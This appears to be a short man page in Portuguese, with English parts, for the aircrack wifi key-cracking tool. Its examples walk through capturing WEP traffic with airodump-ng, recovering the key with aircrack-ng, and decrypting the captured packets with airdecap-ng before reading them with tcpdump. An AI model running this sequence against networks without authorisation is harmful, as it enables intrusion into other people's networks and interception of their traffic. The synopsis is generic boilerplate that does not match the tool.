aircrack(1) -- Programa para quebrar senha de rede wifi
===============================================


SYNOPSIS
--------

`aircrack` [`-bar`] [`-c` *config-file* ] *file* ...

DESCRIÇÃO
---------

`aircrack`é um programa utilizado na maioria das vezes por *hacker* para quebrar a senha de redes wifi.


OPÇÕES
------

* `-w` FILENAME:
  Usar uma wordlist FILENAME.

EXEMPLOS
--------

root@crack_WEP:~# airodump-ng mon0
[ CH 10 ][ Elapsed: 4 s ][ 2009-08-08 18:01 ][]
 BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
 00:A0:C5:FF:84:72  197        4        0    0   1  11  WEP  WEP         private
 BSSID              STATION            PWR   Rate  Lost  Packets  Probes



root@crack_WEP:~# airodump-ng --channel 1 --bssid 00:A0:C5:FF:84:72 --write temp wlan0

 CH  1 ][ Elapsed: 31 mins ][ 2009-05-02 21:52                                         
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
 00:A0:C5:FF:84:72  205  10     6058    24496    0   1  54  WEP  WEP         private           
 BSSID              STATION            PWR   Rate  Lost  Packets  Probes                       
 00:A0:C5:FF:84:72  00:18:4D:76:30:EB  188  54-54     0    24795       








root@crack_WEP:~# aircrack-ng -z -b 00:A0:C5:FF:84:72 temp.cap-0*.cap 

                                         Aircrack-ng 1.0 rc1

                         [00:00:22] Tested 240228 keys (got 41742 IVs)

   KB    depth   byte(vote)
    0    0/  1   B9(58880) A0(50688) 12(50176) F5(49920) 9E(48896) CD(48640) 
    1    0/  1   19(54784) E8(52480) FA(52480) 4B(51456) 79(51456) DD(49664) 
    2    0/  1   31(59648) EA(53504) 40(50688) 0A(50432) 88(50432) 0E(50176) 
    3    0/  1   8C(60416) 05(49152) 56(49152) 23(48640) 52(48384) 03(48128) 
    4    0/  1   B2(59136) AE(49664) 78(49152) FE(49152) 8B(48384) 9C(47616) 
    5    0/  1   61(53504) E6(50688) FF(50176) 13(49664) 23(49408) C7(49408) 
    6    0/  1   DD(56320) C4(51968) 90(50688) 0C(50176) CF(49920) CE(49152) 
    7    0/  1   4E(53248) E6(51968) 7D(49152) 0B(48896) 90(48896) 06(48640) 
    8    0/  1   FB(52224) C1(49664) E9(48128) 3D(47616) F0(47360) EB(47104) 
    9    0/  1   0B(54784) BC(51712) 52(50432) 54(49920) F5(49920) CA(48896) 
   10    0/  1   E6(50944) 1C(49920) 5F(49408) 1F(49152) 0A(48896) 83(48896) 
   11    2/  1   FF(49664) 17(48384) 94(48128) 27(47872) 23(47616) B2(47616) 
   12    0/  4   91(50452) A4(50360) 77(50156) 78(49540) FF(49476) 70(48788) 

             KEY FOUND! [ B9:19:31:8C:B2:61:DD:4E:FB:0B:AA:62:99 ] 
	Decrypted correctly: 100%





`Decrypt the traffic`
It is possible to capture the traffic in .cap files as above, decrypt it in a second file before sending it to the tcpdump command for instance:

root@crack_WEP:~# airdecap-ng -w b919318cb261dd4efb0baa6299 temp-01.cap
Total number of packets read         22072
Total number of WEP data packets      6245
Total number of WPA data packets         0
`Number of plaintext data packets         3
Number of decrypted WEP  packets      6245
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets         0

root@crack_WEP:~# tcpdump -r temp-01-dec.cap -i wlan



ARQUIVOS
--------

 Use uma wordlist para ajudar a achar a chave.

ENVIRONMENT
-----------

O cdshell prove uma ferramenta chamada generator_wordlist.py que pode ser usada para gerar uma wordlist do jeito que você desejar.

AUTOR
-----

Rafael Quirino - <quirinobytes (a) gmail com>

VEJA SOBRE
----------

ronn(5), markdown(1), txt2tags(1) [Linux Man Page Howto](
http://www.schweikhardt.net/man_page_howto.html)
